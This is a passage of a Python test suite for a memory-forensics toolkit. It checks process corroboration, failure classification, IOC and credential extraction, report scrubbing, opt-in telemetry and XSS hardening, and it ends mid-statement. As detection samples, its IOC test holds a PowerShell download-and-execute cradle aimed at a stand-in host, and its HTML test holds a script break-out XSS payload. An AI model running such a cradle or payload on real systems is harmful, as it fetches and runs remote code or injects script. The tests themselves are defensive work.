#!/usr/bin/env python3
"""Tier-A golden tests — fast, no memory images, zero third-party deps.

Run:  python3 tests/run_tests.py     (exit 0 = all pass, non-zero = failure)

These pin the pure, kernel-independent logic — the parsing/health/IOC code that
is *your* code, not Volatility's — so old bugs (e.g. the Bug-#10 silent-empty
process list) can't silently come back. They deliberately do NOT drive
Volatility. The runtime wiring (subprocess, parse, demotion, resume sidecar,
run_health/crash_report, HTML report) is covered by the Tier-B canary,
`tests/run_canary.py`, which drives the real pipeline against a fake Vol3 stub.
"""

import sys
import json
import logging
import os
import types
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
FIX = Path(__file__).resolve().parent / "fixtures"

_PASS = 0
_FAIL = 0


def check(name, cond, detail=""):
    global _PASS, _FAIL
    if cond:
        _PASS += 1
        print(f"  PASS  {name}")
    else:
        _FAIL += 1
        print(f"  FAIL  {name}   {detail}")


# --------------------------------------------------------------------------- #
def test_corroborate_processes():
    from modules import run_health as rh
    C = rh.CRITICAL
    print("[corroborate_processes]")

    ok = rh.corroborate_processes({"pslist": 37, "psscan": 37, "pstree": 37})
    check("healthy run -> no findings", ok == [], detail=str(ok))

    bug10 = rh.corroborate_processes({"pslist": 0, "psscan": 120, "pstree": 0})
    check("Bug-#10 (pslist=0, psscan=120) -> CRITICAL",
          any(f["severity"] == C for f in bug10), detail=str(bug10))
    check("Bug-#10 message names psscan",
          any("psscan" in f["message"] for f in bug10))

    empty = rh.corroborate_processes({"pslist": 0, "psscan": 0, "pstree": 0})
    check("all-empty -> CRITICAL", any(f["severity"] == C for f in empty))

    none = rh.corroborate_processes({"pslist": None, "psscan": None, "pstree": None})
    check("no plugins ran -> CRITICAL", any(f["severity"] == C for f in none))

    hidden = rh.corroborate_processes({"pslist": 40, "psscan": 60, "pstree": 40})
    check("psscan>>pslist -> WARN (not critical)",
          hidden and all(f["severity"] != C for f in hidden), detail=str(hidden))

    # H1: psaux fallback corroboration when no pool-scan source ran (e.g. macOS).
    macbug = rh.corroborate_processes({"pslist": 0, "psscan": None,
                                       "pstree": 0, "psaux": 88}, "mac")
    check("mac psaux>0 + pslist empty + no psscan -> CRITICAL",
          any(f["severity"] == C for f in macbug), detail=str(macbug))
    check("mac fallback message names psaux",
          any("psaux" in f["message"] for f in macbug))
    macok = rh.corroborate_processes({"pslist": 50, "psscan": None,
                                      "pstree": 50, "psaux": 50}, "mac")
    check("mac healthy (no psscan, pslist==psaux) -> no findings",
          macok == [], detail=str(macok))
    both = rh.corroborate_processes({"pslist": 0, "psscan": 120,
                                     "pstree": 0, "psaux": 0}, "linux")
    check("psscan Bug-#10 still fires when psaux also present",
          any("psscan" in f["message"] for f in both))
    # H1: on Linux, scan ≫ list is normal (dead task_structs) — must NOT WARN.
    lin_excess = rh.corroborate_processes({"pslist": 232, "psscan": 904,
                                           "pstree": 200, "psaux": 232}, "linux")
    check("linux psscan≫pslist -> no noise WARN", lin_excess == [],
          detail=str(lin_excess))
    win_excess = rh.corroborate_processes({"pslist": 40, "psscan": 90,
                                           "pstree": 40}, "windows")
    check("windows psscan≫pslist -> WARN kept",
          any("exceeds" in f["message"] for f in win_excess))


def test_classify_failure():
    from modules import run_health as rh
    print("[classify_failure]")
    cases = {
        "AttributeError: 'taint_flag' object has no attribute 'module'": "struct-mismatch",
        "Member not present in template: mnt": "struct-mismatch",
        "No matching ISF for this banner": "symbol-missing",
        "A symbol table requirement was not fulfilled": "symbol-missing",
        "plugin timed out after 600s": "timeout",
    }
    for text, expected in cases.items():
        got = rh.classify_failure(text)["category"]
        check(f"{expected:16} <- {text[:40]!r}", got == expected, detail=f"got {got}")

    # Expected-nonbugs are recognised by PLUGIN NAME, regardless of error text.
    banner = "Volatility Foundation Volatility Framework 2.6.1"
    for name in ("connections", "connscan", "sockets"):
        got = rh.classify_failure(banner, name)["category"]
        check(f"expected-nonbug by name: {name}", got == "expected-nonbug",
              detail=f"got {got}")
    # a sockstat timeout is lost network data, not a documented non-bug
    got = rh.classify_failure("Timed out twice (333s, then 832s)", "linux.sockstat.Sockstat")
    check("sockstat timeout -> timeout (not expected-nonbug)", got["category"] == "timeout",
          detail=str(got))

    # Banner-only / empty error = benign empty result, not a real failure.
    check("banner-only error -> empty-result",
          rh.classify_failure(banner, "ssdt")["category"] == "empty-result")
    check("empty error -> empty-result",
          rh.classify_failure("", "whatever")["category"] == "empty-result")


def test_assess_fixtures():
    from modules import run_health as rh
    print("[assess() on fixtures]")

    good = rh.assess(FIX / "good_win", "windows")
    check("healthy fixture -> status healthy",
          good["status"] == "healthy", detail=good["status"])
    check("healthy fixture -> no critical findings",
          all(f["severity"] != rh.CRITICAL for f in good["findings"]))

    bug = rh.assess(FIX / "bug10_win", "windows")
    check("Bug-#10 fixture -> status broken",
          bug["status"] == "broken", detail=bug["status"])
    check("Bug-#10 fixture -> critical process finding",
          any(f["check"] == "processes" and f["severity"] == rh.CRITICAL
              for f in bug["findings"]))

    import tempfile
    with tempfile.TemporaryDirectory() as td:
        lg = Path(td) / "crescent_toolkit.log"
        lg.write_text(
            "[06:44:37] [crescent.EXTRACTOR] [WARNING] [19/19] linux.library_list.LibraryList FAILED: "
            "Timed out twice (372s, then 930s)\n"
            "[06:44:38] [crescent.EXTRACTOR] [WARNING] [3/19] linux.lsof.Lsof FAILED: Timed out twice\n"
            "[18:28:31] [crescent.EXTRACTOR] [INFO] [2/2] linux.library_list.LibraryList completed (1297.6s)\n",
            encoding="utf-8")
        tax = rh._classify_log_failures(lg)
        check("run health: a plugin that failed earlier but completed on a resume is not listed",
              [t["plugin"] for t in tax] == ["linux.lsof.Lsof"], tax)


def test_advisory_nonempty():
    from modules import run_health as rh
    print("[advisory_nonempty]")
    W, C = rh.WARN, rh.CRITICAL

    f = rh.advisory_nonempty("windows", {"svcscan": 0, "modules": 120})
    check("windows empty svcscan -> WARN",
          any(x["check"] == "svcscan" and x["severity"] == W for x in f), detail=str(f))
    check("windows non-empty modules -> not flagged",
          not any(x["check"] == "modules" for x in f))

    check("plugin that didn't run (None) -> not flagged",
          rh.advisory_nonempty("windows", {"svcscan": None, "modules": None}) == [])
    check("linux non-empty lsof -> no WARN",
          rh.advisory_nonempty("linux", {"lsof": 4200}) == [])

    f4 = rh.advisory_nonempty("linux", {"lsof": 0})
    check("linux empty lsof -> WARN", any(x["check"] == "lsof" for x in f4))
    check("advisory findings are never critical",
          all(x["severity"] != C for x in f + f4))
    check("unknown os -> no advisory", rh.advisory_nonempty("plan9", {"x": 0}) == [])


def test_ioc_extractor():
    from modules.ioc_extractor import IOCExtractor
    print("[ioc_extractor.scan_single_string]")
    ie = IOCExtractor(logging.getLogger("test"))

    def cats(s):
        return {r["category"] for r in ie.scan_single_string(s)}

    def matches(s):
        return {r["match"] for r in ie.scan_single_string(s)}

    check("plain prose -> NO IOCs (false-positive guard)",
          cats("hello world this is a normal sentence") == set(),
          detail=str(cats("hello world this is a normal sentence")))
    check("public IP -> network category",
          "network" in cats("attacker at 203.0.113.45 connected"))
    check("URL -> network category",
          "network" in cats("beacon to http://evil.example.com/c2"))
    check("email -> email category",
          "email" in cats("contact bad.actor@evil.com"))
    btc = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    check("bitcoin address -> crypto, exact match",
          "crypto" in cats(f"pay {btc}") and btc in matches(f"pay {btc}"))
    tok = "sk-ant-oat01-" + "Ab3_x-" * 15 + "Q9zAA"          # 13 + 90 + 5 = 108
    check("anthropic OAuth token found even with glued suffix",
          tok in matches(f"Bearer {tok}Content-Type"), detail=str(matches(f"Bearer {tok}x")))
    kept = ie._filter_matches("api_token", {
        "apiKey:process.env.AWS_BEARER_TOKEN_BEDROCK",
        "ApiKey = Environment.GetEnvironmentVariable",
        "API-KEY: pubea5604404508cdd34afb69e6f42a05bc"})
    unc = ie._filter_matches("unc_path", {r"\\-.\\d", r"\\.\\d+", r"\\Anthropic\\Messages",
                                          r"\\fileserver\share\docs", r"\\.\pipe\cc-daemon"})
    check("unc_path: regex/escaped source dropped, real share + pipe kept",
          unc == {r"\\fileserver\share\docs", r"\\.\pipe\cc-daemon"}, detail=str(unc))
    win = ie._filter_matches("windows_path", {r"A:\$", r"I:\n\n1.", r"e:\d+",
                                              r"C:\Users\bob\.ssh\id_rsa", r"c:\tmpz"})
    check("windows_path: escapes dropped, real paths (incl. dot-dirs) kept",
          win == {r"C:\Users\bob\.ssh\id_rsa", r"c:\tmpz"}, detail=str(win))
    pw = ie._filter_matches("password_in_url", {"PASS:()=>tku", "password:t.password}",
                                                "pass=Hunter2x"})
    check("password_in_url: JS code dropped, real value kept", pw == {"pass=Hunter2x"},
          detail=str(pw))
    pw2 = ie._filter_matches("password_in_url", {"Pass:error:", "Pass:forView:withProposedMinWidth:",
                                                 "PWD:Saya!", "PWD=/home/user"})
    check("password_in_url: ObjC selectors + $PWD paths dropped, 'PWD:Saya!' kept",
          pw2 == {"PWD:Saya!"}, detail=str(pw2))
    at = ie._filter_matches("api_token", {"Token::HereDoc5.180.0.0.1.1263389684",
                                          "apikey=c0570cc3b05346d790b276b2c1355300"})
    check("api_token: Perl namespace dropped", at == {"apikey=c0570cc3b05346d790b276b2c1355300"},
          detail=str(at))
    ps = lambda s: any("powershell" in str(r).lower() for r in ie.scan_single_string(s))
    check("powershell_download: minified 'Irm,' / bare 'downloadData' ignored, call forms hit",
          not ps("Irm,e,t,null,0n)") and not ps("downloadData")
          and ps("iex (New-Object Net.WebClient).DownloadString('http://x/a')"),
          detail="")
    from modules import ioc_extractor as iem
    def _pok(kind, s):
        rx = dict(iem._PROTO)[kind]
        m = rx.search(s)
        return bool(m) and iem._proto_ok(kind, m.group(0), m)
    check("email protocol traces: printf templates rejected, real ones kept",
          not _pok("smtp_rcpt_to", "RCPT TO:<%s@%s>") and not _pok("pop3_user", "USER %s")
          and _pok("smtp_rcpt_to", "RCPT TO:<bob@corp.example>"))
    check("api_token: code identifiers dropped, real key kept",
          kept == {"API-KEY: pubea5604404508cdd34afb69e6f42a05bc"}, detail=str(kept))


def test_comms_scanner():
    from modules.comms_scanner import CommsScanner
    print("[comms_scanner]")
    cs = CommsScanner(logging.getLogger("test"))
    cs._init_results()
    tok = "sk-ant-api03-" + "Zq7-_r" * 15 + "k2LAA"
    for line in ['{"content": "hello there this is a generic chat line", "role": "user"}',
                 '"text": "release notes for the new build"',
                 "Ae.session", "Bt.session",
                 "00000000:f2436f6vrmtcw2seeu6a-pq3g8i-1d1dd7d",
                 "x=live:Date.now;keep-alive:timeout",
                 "-----BEGIN EC PRIVATE KEY-----", "not base64 at all",
                 "-----BEGIN RSA PRIVATE KEY-----",
                 "MIIEowIBAAKCAQEA1x2Q3w4E5r6T7y8U9i0O1p2A3s4D5f6G7h8J9k0L",
                 '{"guild_id": "123456789012345678", "content": "meet at 5 behind the shop"}',
                 f"Authorization: Bearer {tok}", f"{tok}Content-Type"]:
        cs._process_line(line)
    r = cs._compile_results()
    apps = r["apps"]
    cat = lambda a, c: set(apps.get(a, {}).get("categories", {}).get(c, {}).get("values", []))
    check("comms: generic JSON 'content'/'text' without app context -> not attributed",
          not cat("teams", "message") and not cat("slack", "message")
          and not cat("whatsapp", "message"), detail=str(apps.keys()))
    check("comms: discord message kept when line has discord context",
          cat("discord", "message_content") == {"meet at 5 behind the shop"})
    check("comms: JS '.session' / zero bot token / 'live:Date' rejected",
          not cat("telegram", "session_file") and not cat("telegram", "bot_token")
          and not cat("skype", "skype_id"))
    check("comms: PEM header counted only when key data follows",
          cat("generic_tokens", "private_key") == {"-----BEGIN RSA PRIVATE KEY-----"},
          detail=str(cat("generic_tokens", "private_key")))
    cs2 = CommsScanner(logging.getLogger("test"))
    cs2._init_results()
    for line in ["ASIANABUNDANCEACCORD AKIAISLANDISSHARITAL", "key AKIAIOSFODNN7EXAMPL3 x",
                 "x&rtb_tid=02e53f3a-e131-4502-b8de-d996511ea6a3&rpid=1",
                 '"tenantId": "11111111-2222-3333-4444-555555555555"',
                 "https://web.skype.com/share?url={0}&source=button&text={1}",
                 '{"channel": "latest/stable", "x": "https://slack.com/"}']:
        cs2._process_line(line)
    a2 = cs2._compile_results()["apps"]
    c2 = lambda a, c: set(a2.get(a, {}).get("categories", {}).get(c, {}).get("values", []))
    check("comms: AWS key needs base32+digit (English caps rejected)",
          c2("generic_tokens", "aws_key") == {"AKIAIOSFODNN7EXAMPL3"},
          detail=str(c2("generic_tokens", "aws_key")))
    check("comms: 'rtb_tid=' not a tenant id; tenantId kept",
          c2("teams", "tenant_id") == {"11111111-2222-3333-4444-555555555555"},
          detail=str(c2("teams", "tenant_id")))
    check("comms: URL templates and snap channels rejected",
          not c2("skype", "skype_url") and not c2("slack", "channel"))
    check("comms: anthropic key found once (glued variant collapsed)",
          cat("generic_tokens", "anthropic_key") == {tok},
          detail=str(cat("generic_tokens", "anthropic_key")))


# Frozen whitelist of top-level keys crash_report.build may ever emit. A new key
# here must be a deliberate, reviewed change — this guards against a future field
# silently carrying image-derived data into the handoff artifact.
_CRASH_KEYS = {
    "schema", "generated", "note", "tool_version", "run", "host", "target",
    "toolchain", "process_corroboration", "findings", "failed_plugins",
    "ok_plugins", "fingerprint",
}


def test_crash_report():
    from modules import crash_report as cr
    from modules import run_health as rh
    print("[crash_report]")

    # --- scrub(): every sensitive shape is redacted ---
    s = cr.scrub("read /home/kali/case/dump.raw at 0xdeadbeef and "
                 "C:\\Users\\victim\\m.exe")
    check("scrub redacts unix user path", "/home/kali" not in s, detail=s)
    check("scrub redacts windows path", "victim" not in s, detail=s)
    check("scrub redacts hex address", "0xdeadbeef" not in s, detail=s)
    check("scrub inserts placeholders", "<path>" in s and "<addr>" in s, detail=s)

    # --- parse_kernel_banner(): version+distro only, builder identity dropped ---
    banner = ("Linux version 6.1.0-kali9-amd64 (devel@buildbox) "
              "(gcc 13) #1 SMP Kali 6.1.27-1kali1")
    pk = cr.parse_kernel_banner(banner)
    check("banner -> kernel version", pk["kernel"] == "6.1.0-kali9-amd64",
          detail=str(pk))
    check("banner -> distro Kali", pk["distro"] == "Kali", detail=str(pk))
    check("banner builder user@host NOT retained",
          "buildbox" not in json.dumps(pk) and "devel@" not in json.dumps(pk))
    check("ubuntu banner -> Ubuntu",
          cr.distro_from_banner("Linux version 5.15.0-91 (Ubuntu 11.4)") == "Ubuntu")

    # --- fingerprint(): 16 hex chars, order-independent ---
    tgt = {"os_type": "linux", "engine": "vol3", "kernel": "6.1", "distro": "Kali"}
    f1 = cr.fingerprint(tgt, [{"plugin": "a", "category": "x"},
                              {"plugin": "b", "category": "y"}])
    f2 = cr.fingerprint(tgt, [{"plugin": "b", "category": "y"},
                              {"plugin": "a", "category": "x"}])
    check("fingerprint stable + order-independent",
          f1 == f2 and len(f1) == 16, detail=f"{f1} vs {f2}")

    # --- build(): whitelisted keys only, correct status, no leakage ---
    health = {
        "status": "degraded",
        "process_counts": {"pslist": 5, "psscan": 5, "pstree": 5},
        "findings": [{"severity": "warning", "check": "files",
                      "message": "empty at /home/zztopsecret/case 0xCAFEB0BE"}],
        "failure_taxonomy": [{"plugin": "linux.lsof.Lsof",
                              "category": "struct-mismatch",
                              "reason": "read /home/zzanalyst/x on 0x41414141"}],
    }
    rep = cr.build(FIX / "good_win", os_type="linux", engine="vol3", profile=None,
                   mode="full",
                   results={"ok": 10, "fail": 1, "duration": 12.3,
                            "skipped": 0, "dep_skipped": 0},
                   health=health)
    check("build emits only whitelisted keys",
          set(rep) == _CRASH_KEYS, detail=str(set(rep) ^ _CRASH_KEYS))
    check("build carries status through", rep["run"]["status"] == "degraded")
    check("build maps taxonomy -> failed_plugins",
          rep["failed_plugins"] and rep["failed_plugins"][0]["name"] == "linux.lsof.Lsof")
    blob = json.dumps(rep)
    check("build leaks NO target path", "zztopsecret" not in blob
          and "zzanalyst" not in blob, detail="path leaked into report")
    check("build leaks NO raw address", "0xCAFEB0BE" not in blob
          and "0x41414141" not in blob)
    check("build scrubs into placeholders", "<path>" in blob and "<addr>" in blob)

    # --- _should_write(): fires on real trouble, silent on benign-only ---
    sw = cr._should_write
    check("healthy + no failures -> no report",
          sw({"fail": 0}, {"status": "healthy", "failure_taxonomy": []}) is False)
    check("healthy + only expected-nonbug/empty -> no report",
          sw({"fail": 2}, {"status": "healthy",
             "failure_taxonomy": [{"category": "expected-nonbug"},
                                  {"category": "empty-result"}]}) is False)
    check("healthy + a real failure (timeout) -> report",
          sw({"fail": 1}, {"status": "healthy",
             "failure_taxonomy": [{"category": "timeout"}]}) is True)
    check("degraded status -> report",
          sw({"fail": 0}, {"status": "degraded", "failure_taxonomy": []}) is True)
    check("failures present but unclassified -> report",
          sw({"fail": 3}, {"status": "healthy", "failure_taxonomy": []}) is True)

    # --- write(): artifact only on real failure; benign/clean runs leave nothing ---
    v = types.SimpleNamespace(os_type="windows", vol_version="vol3", profile=None)
    good_health = rh.assess(FIX / "good_win", "windows")
    none_path = cr.write(FIX / "good_win", "img.raw", v,
                         "full", {"ok": 5, "fail": 0}, good_health)
    check("healthy run writes NO crash_report", none_path is None, detail=str(none_path))

    bug_health = rh.assess(FIX / "bug10_win", "windows")
    out = cr.write(FIX / "bug10_win", "img.raw", v,
                   "full", {"ok": 1, "fail": 0, "duration": 3.0}, bug_health)
    try:
        check("broken run writes crash_report.json",
              out is not None and Path(out).is_file(), detail=str(out))
        if out and Path(out).is_file():
            data = json.loads(Path(out).read_text())
            check("written report has broken status",
                  data["run"]["status"] == "broken", detail=str(data["run"]))
            check("ok_plugins excludes bookkeeping files",
                  "run_health" not in data["ok_plugins"]
                  and "crash_report" not in data["ok_plugins"])
    finally:
        if out and Path(out).is_file():
            Path(out).unlink()  # keep fixtures pristine

    import tempfile
    with tempfile.TemporaryDirectory() as td:
        (Path(td) / "crash_report.json").write_text('{"old": 1}', encoding="utf-8")
        r = cr.write(td, "img.raw", v, "full", {"ok": 5, "fail": 0},
                     {"status": "healthy", "failure_taxonomy": []})
        check("clean resume: stale crash_report.json kept as crash_report.previous.json",
              r is None and not (Path(td) / "crash_report.json").exists()
              and (Path(td) / "crash_report.previous.json").read_text(encoding="utf-8") == '{"old": 1}')


def test_vol3_demotion():
    from modules.volatility import (_vol3_success, _is_empty_result,
                                    _is_plugin_exception, _write_error_marker)
    print("[vol3 silent-failure demotion]")
    ATTR = "AttributeError: 'module' object has no attribute 'taint_flag'"

    # _is_empty_result
    check("'[]' is empty", _is_empty_result("[]"))
    check("'[\\n]' is empty (whitespace-tolerant)", _is_empty_result("[\n]"))
    check("real rows not empty", not _is_empty_result('[{"pid":1}]'))

    # _is_plugin_exception — systemic only, no benign demotes
    check("AttributeError -> exception", _is_plugin_exception(ATTR))
    check("not-present-in-template -> exception",
          _is_plugin_exception("Member not present in template: mnt"))
    check("clean banner -> not exception",
          not _is_plugin_exception("Volatility 3 Framework 2.28.1"))
    check("warning -> not exception (won't demote)",
          not _is_plugin_exception("UserWarning: deprecated"))
    check("empty stderr -> not exception", not _is_plugin_exception(""))

    # _vol3_success — the core new-kernel demotion
    check("linux rc0 + rows -> success",
          _vol3_success(0, '[{"pid":1}]', "", "linux"))
    check("linux rc0 + clean-empty -> success (no false demote)",
          _vol3_success(0, "[]", "", "linux"))
    check("linux rc0 + EMPTY + struct exc -> DEMOTED to fail",
          not _vol3_success(0, "[]", ATTR, "linux"))
    check("linux rc0 + ROWS + struct exc -> kept (evidence-preserving)",
          _vol3_success(0, '[{"pid":1}]', ATTR, "linux"))
    check("mac rc0 + empty + struct exc -> DEMOTED",
          not _vol3_success(0, "[]", ATTR, "mac"))
    check("rc!=0 -> fail", not _vol3_success(1, '[{"pid":1}]', "", "linux"))
    check("stdout 'Unsatisfied requirement' -> fail",
          not _vol3_success(0, "Unsatisfied requirement for kernel", "", "linux"))
    check("windows rc0 + empty -> fail (unchanged)",
          not _vol3_success(0, "[]", "", "windows"))
    UA = ("WARNING  volatility3.plugins.windows.registry.userassist: UserAssist key not found "
          "in \\??\\C:\\Users\\u\\ntuser.dat at 0x9084bf169000")
    check("windows rc0 + empty + 'key not found' -> success (genuine absence)",
          _vol3_success(0, "[]", UA, "windows"))
    check("windows rc0 + empty + 'key not found' + traceback -> fail",
          not _vol3_success(0, "[]", UA + "\nTraceback (most recent call last):", "windows"))
    check("windows rc0 + real rows -> success (unchanged)",
          _vol3_success(0, '[{"pid":1,"name":"System"}]', "", "windows"))

    # _write_error_marker — resume sidecar lifecycle (fixes cache poisoning)
    import tempfile, shutil
    d = Path(tempfile.mkdtemp())
    try:
        jp = d / "linux_lsmod_Lsmod.json"
        jp.write_text("[]")
        marker = Path(str(jp) + ".error")
        _write_error_marker(jp, False, ATTR)
        check("failure leaves .error sidecar",
              marker.exists() and "taint_flag" in marker.read_text())
        _write_error_marker(jp, True, "")
        check("success clears .error sidecar", not marker.exists())
    finally:
        shutil.rmtree(d, ignore_errors=True)


def test_telemetry():
    from modules import crash_report as cr
    import tempfile, threading, shutil
    from http.server import BaseHTTPRequestHandler, HTTPServer
    print("[telemetry / Step 2 transport]")

    # Isolate config to a temp file so the real ~/.config is never touched.
    tmpdir = Path(tempfile.mkdtemp())
    os.environ["CRESCENT_TELEMETRY_CONFIG"] = str(tmpdir / "telemetry.json")
    os.environ.pop("CRESCENT_TELEMETRY", None)
    os.environ.pop("CRESCENT_TELEMETRY_ENDPOINT", None)
    try:
        # gating: default OFF, env precedence over config
        check("default OFF (no config/env)", cr.telemetry_enabled({}) is False)
        check("env=1 forces ON",
              cr.telemetry_enabled({}, {"CRESCENT_TELEMETRY": "1"}) is True)
        check("env=0 forces OFF over enabled config",
              cr.telemetry_enabled({"enabled": True}, {"CRESCENT_TELEMETRY": "0"}) is False)
        check("config enabled -> ON", cr.telemetry_enabled({"enabled": True}, {}) is True)

        # _should_send dedup/gating
        check("no endpoint -> no send", not cr._should_send("fp1", [], True, None))
        check("disabled -> no send", not cr._should_send("fp1", [], False, "http://x"))
        check("new fingerprint -> send", cr._should_send("fp1", ["fp0"], True, "http://x"))
        check("already-sent fingerprint -> skip",
              not cr._should_send("fp1", ["fp1"], True, "http://x"))

        # payload keeps the scrubbed report, only adds install_id
        rep = {"schema": cr.SCHEMA, "fingerprint": "abc", "target": {"kernel": "6.1"}}
        pl = cr.build_payload(rep, "iid123")
        check("payload adds install_id", pl.get("install_id") == "iid123")
        check("payload preserves report body", pl["fingerprint"] == "abc")
        check("send('') is a no-op (no endpoint)", cr.send({"x": 1}, "") is False)

        # L1: transport drops the free-text reason for the `other` category only
        rep_fp = {"schema": cr.SCHEMA, "fingerprint": "y", "failed_plugins": [
            {"name": "a", "category": "other", "reason": "raw scrubbed error text"},
            {"name": "b", "category": "struct-mismatch", "reason": "kernel struct changed"}]}
        pl2 = cr.build_payload(rep_fp, "iid")
        other = next(p for p in pl2["failed_plugins"] if p["category"] == "other")
        struct = next(p for p in pl2["failed_plugins"] if p["category"] == "struct-mismatch")
        check("transport drops 'other' free-text reason", other["reason"] == "")
        check("transport keeps classified reason", struct["reason"] == "kernel struct changed")
        check("build_payload does not mutate source report",
              rep_fp["failed_plugins"][0]["reason"] == "raw scrubbed error text")

        # REAL localhost transport — validates the POST path with no external svc
        received = {}
        class H(BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get("Content-Length", 0))
                received["body"] = json.loads(self.rfile.read(n))
                self.send_response(200); self.end_headers()
            def log_message(self, *a):
                pass
        srv = HTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=srv.handle_request, daemon=True).start()
        ok = cr.send({"schema": cr.SCHEMA, "fingerprint": "abc"},
                     f"http://127.0.0.1:{srv.server_address[1]}/ingest")
        check("send() POSTs to a live endpoint (2xx)", ok is True)
        check("endpoint received the scrubbed payload",
              received.get("body", {}).get("fingerprint") == "abc")
        srv.server_close()

        # maybe_send end-to-end via saved config, with fingerprint dedup
        hits = {"n": 0}
        class H2(BaseHTTPRequestHandler):
            def do_POST(self):
                n = int(self.headers.get("Content-Length", 0)); self.rfile.read(n)
                hits["n"] += 1
                self.send_response(200); self.end_headers()
            def log_message(self, *a):
                pass
        srv2 = HTTPServer(("127.0.0.1", 0), H2)
        threading.Thread(target=lambda: (srv2.handle_request(), srv2.handle_request()),
                         daemon=True).start()
        cr.enable(f"http://127.0.0.1:{srv2.server_address[1]}/ingest")
        report = {"fingerprint": "zz-once", "schema": cr.SCHEMA}
        first = cr.maybe_send(report)
        second = cr.maybe_send(report)  # same fingerprint -> deduped, no 2nd POST
        check("maybe_send delivers first time", first is True)
        check("maybe_send dedups the second time", second is False)
        check("exactly one POST reached the endpoint", hits["n"] == 1)
        check("install_id generated on opt-in send", cr.get_install_id() is not None)
        srv2.server_close()
    finally:
        for k in ("CRESCENT_TELEMETRY_CONFIG", "CRESCENT_TELEMETRY",
                  "CRESCENT_TELEMETRY_ENDPOINT"):
            os.environ.pop(k, None)
        shutil.rmtree(tmpdir, ignore_errors=True)


def test_html_report_xss():
    from utils.json_converter import safe_js_json
    print("[html report XSS hardening]")
    PAY = '</script><img src=x onerror=alert(1)><!-- &'

    blob = safe_js_json({"proc": PAY})
    check("embedded JSON has no raw '<'", "<" not in blob)
    check("embedded JSON has no raw '>'", ">" not in blob)
    check("embedded JSON has no raw '&'", "&" not in blob)
    check("embedded JSON has no U+2028", "\u2028" not in blob)
    check("payload round-trips losslessly", json.loads(blob)["proc"] == PAY)
    check("break-out sequence encoded, not literal",
          "</script><img" not in blob and "\\u003c/script" in blob)

    # end-to-end: the report generator must embed via safe_js_json, so a hostile
    # process name cannot inject a live <script>/<img> into report.html.
    try:
        from modules.html_report import HTMLReportGenerator
        gen = HTMLReportGenerator(logging.getLogger("t"), "windows")
        html = gen._build_html({"counts": {"evilproc": PAY}}, Path("/tmp/x"))
        check("_build_html: no live break-out from payload",
              "</script><img src=x" not in html)
        check("_build_html: payload survives only encoded",
              "\\u003c/script" in html)
    except Exception as exc:
        check("_build_html end-to-end reachable", False, detail=repr(exc))


def test_download_integrity():
    from modules import dbgsym_builder as db
    import tempfile, shutil, hashlib
    print("[download integrity H2/H3]")

    # prefer_https: upgrade TLS-capable hosts, leave genuine http-only untouched
    check("http ddebs -> https",
          db.prefer_https("http://ddebs.ubuntu.com/pool/x.ddeb")
          == "https://ddebs.ubuntu.com/pool/x.ddeb")
    check("https left unchanged",
          db.prefer_https("https://deb.debian.org/x") == "https://deb.debian.org/x")
    check("http-only host (centos) left as-is",
          db.prefer_https("http://debuginfo.centos.org/x.rpm")
          == "http://debuginfo.centos.org/x.rpm")
    check("unknown http host not force-upgraded",
          db.prefer_https("http://evil.example.com/x")
          == "http://evil.example.com/x")
    check("DDEBS_POOL is https", db.DDEBS_POOL.startswith("https://"))

    # looks_like_package: real archive magics vs an HTML error page
    check("ar (deb) magic recognised", db.looks_like_package(b"!<arch>\n") is not None)
    check("rpm magic recognised", db.looks_like_package(b"\xed\xab\xee\xdb\x00") is not None)
    check("xz magic recognised", db.looks_like_package(b"\xfd7zXZ\x00") is not None)
    check("HTML error page rejected", db.looks_like_package(b"<!DOCTYPE html>") is None)
    check("empty rejected", db.looks_like_package(b"") is None)

    # verify_downloaded_package on real temp files (magic + sha256)
    d = Path(tempfile.mkdtemp())
    try:
        good = d / "pkg.ddeb"; good.write_bytes(b"!<arch>\ndebian-binary  2.0\n")
        bad = d / "err.ddeb"; bad.write_bytes(b"<html><body>404 Not Found</body></html>")
        check("verify accepts a real ar archive", db.verify_downloaded_package(good) is True)
        check("verify rejects an HTML error page", db.verify_downloaded_package(bad) is False)
        h = hashlib.sha256(good.read_bytes()).hexdigest()
        check("verify accepts matching sha256", db.verify_downloaded_package(good, h) is True)
        check("verify rejects wrong sha256",
              db.verify_downloaded_package(good, "00" * 32) is False)
    finally:
        shutil.rmtree(d, ignore_errors=True)


def test_symbol_zip_integrity():
    from modules.installer import verify_symbol_zip, PINNED_SYMBOL_SHA256
    import tempfile, shutil, zipfile
    print("[symbol zip integrity / pinning]")
    d = Path(tempfile.mkdtemp())
    try:
        good = d / "linux.zip"
        with zipfile.ZipFile(good, "w") as z:
            z.writestr("System.map-6.1.0", "ffffffffdeadbeef kernel_symbol\n" * 20)
        ok, digest, reason = verify_symbol_zip(good)
        check("valid zip -> ok", ok is True, detail=reason)
        check("valid zip -> 64-hex sha256", len(digest) == 64)
        check("matching pin accepted", verify_symbol_zip(good, digest)[0] is True)
        check("wrong pin rejected", verify_symbol_zip(good, "00" * 32)[0] is False)

        bad = d / "err.zip"; bad.write_bytes(b"<html><body>404 Not Found</body></html>")
        ok2, _, reason2 = verify_symbol_zip(bad)
        check("HTML error page rejected", ok2 is False)
        check("rejection reason names zip/mirror",
              "zip" in reason2.lower() or "mirror" in reason2.lower())

        corrupt = d / "trunc.zip"; corrupt.write_bytes(good.read_bytes()[:20])
        check("truncated/corrupt zip rejected", verify_symbol_zip(corrupt)[0] is False)
        check("missing file rejected", verify_symbol_zip(d / "nope.zip")[0] is False)
        check("no default pins (upstream updates not broken)",
              PINNED_SYMBOL_SHA256 == {})
    finally:
        shutil.rmtree(d, ignore_errors=True)


def test_vad_injection():
    from modules.vad_dumper import _load_os_module
    print("[vad_dumper injection heuristic]")
    w = _load_os_module("windows")
    check("RWX region -> injection flag",
          "injection" in (w._is_injection("PAGE_EXECUTE_READWRITE", False) or "").lower())
    check("executable + no backing file -> shellcode flag",
          w._is_injection("PAGE_EXECUTE_READ", False) is not None)
    check("EXECUTE_WRITECOPY file-backed image -> NOT flagged (normal COW code)",
          w._is_injection("PAGE_EXECUTE_WRITECOPY", True) is None)
    check("executable file-backed image -> NOT flagged (normal code)",
          w._is_injection("PAGE_EXECUTE_READ", True) is None)
    check("read-only mapped -> not flagged",
